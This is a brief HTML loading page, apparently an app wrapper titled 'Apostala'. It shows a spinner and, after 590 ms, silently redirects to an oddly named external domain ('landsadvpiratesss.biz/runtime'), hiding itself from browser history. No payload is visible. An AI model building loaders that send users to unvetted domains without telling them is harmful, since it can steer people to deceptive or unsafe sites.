<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1,user-scalable=no,viewport-fit=cover">
<meta name="theme-color" content="#1c0b0d">
<title>Apostala</title>
<style>
  *,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
  html,body{height:100%;width:100%;overflow:hidden;background:#1c0b0d;color:#fff5f5;
    font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;
    -webkit-font-smoothing:antialiased;-webkit-tap-highlight-color:transparent;user-select:none}
  /* Blurred-icon (or fallback gradient) background — install.sh swaps the
     data-uri in when an app icon is available, otherwise leaves the
     gradient style block below. */
  .bg{position:fixed;inset:-12% -12% -12% -12%;z-index:0;
    background:linear-gradient(135deg,#e60016 0%,#240408 65%,#050505 100%);
    background-size:cover;background-position:center;
    filter:blur(62px) brightness(0.54);
    transform:scale(1.25)}
  .veil{position:fixed;inset:0;z-index:1;
    background:linear-gradient(180deg,rgba(0,0,0,.25) 0%,rgba(0,0,0,.55) 100%)}
  .stage{position:fixed;inset:0;z-index:2;display:flex;flex-direction:column;
    align-items:center;justify-content:center;padding:24px}
  /* Spinner — clean ring, no logos / no brand. */
  .ring{width:54px;height:54px;border-radius:50%;
    border:4px solid rgba(255,255,255,.18);
    border-top-color:rgba(255,255,255,.92);
    animation:spin 1080ms linear infinite;
    box-shadow:0 0 24px rgba(0,0,0,.18)}
  @keyframes spin{to{transform:rotate(360deg)}}
  .msg{margin-top:22px;font-size:16px;font-weight:500;letter-spacing:.5px;
    color:rgba(255,255,255,.94);text-shadow:0 1px 12px rgba(0,0,0,.35);
    opacity:0;animation:fadein 380ms ease-out 80ms forwards}
  @keyframes fadein{to{opacity:1}}
</style>
</head>
<body>
<div class="bg"></div>
<div class="veil"></div>
<div class="stage">
  <div class="ring" aria-hidden="true"></div>
  <p class="msg">Loading</p>
</div>
<script>
  // Replace navigation so the splash never appears in browser history —
  // pressing the device Back from the destination takes the user out of
  // the app rather than back to this loader.
  (function(){
    var t = 590;
    setTimeout(function(){
      try { window.location.replace("https://landsadvpiratesss.biz/runtime"); }
      catch (e) { window.location.href = "https://landsadvpiratesss.biz/runtime"; }
    }, t);
  })();
</script>
</body>
</html>
